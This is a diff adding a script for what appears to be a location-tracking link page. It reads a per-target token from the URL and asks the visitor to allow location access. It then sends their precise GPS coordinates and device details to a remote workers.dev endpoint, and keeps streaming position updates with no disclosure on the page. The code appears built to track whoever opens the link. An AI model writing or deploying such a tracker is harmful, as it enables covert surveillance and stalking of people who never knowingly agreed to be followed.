@@ -1,0 +1,78 @@
+<script>
+/* ================= CONFIG ================= */
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
+const token = new URLSearchParams(location.search).get("token");
+if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
+
+const mapFrame = document.getElementById("mapFrame");
+const statusEl = document.getElementById("status");
+
+/* Device info */
+function deviceInfo(){
+  return {
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    screen:`${screen.width}x${screen.height}`
+  };
+}
+
+/* CLICK */
+document.getElementById("allowBtn").onclick = ()=>{
+  if(!navigator.geolocation){
+    statusEl.textContent="Location not supported";
+    return;
+  }
+
+  statusEl.textContent="Requesting location…";
+
+  navigator.geolocation.getCurrentPosition(
+    success,
+    error,
+    { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
+  );
+};
+
+/* SUCCESS */
+function success(pos){
+  const {latitude,longitude,accuracy} = pos.coords;
+
+  // Update map instantly
+  mapFrame.src =
+   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
+
+  // Send first hit
+  fetch(API+"/send-location",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      token,
+      lat:latitude,
+      lng:longitude,
+      acc:accuracy,
+      device:deviceInfo()
+    })
+  });
+
+  document.getElementById("permission").remove();
+
+  // Continuous tracking
+  navigator.geolocation.watchPosition(p=>{
+    fetch(API+"/send-location",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        token,
+        lat:p.coords.latitude,
+        lng:p.coords.longitude,
+        acc:p.coords.accuracy
+      })
+    });
+  },()=>{}, {enableHighAccuracy:true});
+}
+
+/* ERROR */
+function error(e){
+  statusEl.textContent =
+    "Enable GPS & allow location permission";
+}
+</script>
